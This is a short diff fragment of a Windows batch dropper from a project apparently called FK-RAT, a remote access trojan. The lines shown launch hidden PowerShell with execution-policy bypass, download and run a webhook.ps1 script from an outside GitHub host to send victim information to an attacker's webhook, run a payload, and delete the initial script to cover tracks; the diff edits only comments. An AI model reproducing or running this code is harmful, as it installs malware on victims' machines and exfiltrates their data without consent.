@@ -17,10 +17,10 @@ powershell powershell.exe -windowstyle hidden -ep bypass "Invoke-WebRequest -URI
 @REM run payload
 powershell ./wget.cmd
 
-@REM Send IP to Webhook
+@REM Send information to Webhook
 powershell powershell.exe -windowstyle hidden -c "Invoke-WebRequest -URI https://github.com/Sunnickel/FK-RAT/raw/main/resources/webhook.ps1 -OutFile webhook.ps1"
 powershell -ep bypass ./webhook.ps1 "%WEBHOOK%"
 
-@REM cd change back to initial location
+@REM self delete
 cd "%INITIALPATH%"
 del initial.cmd
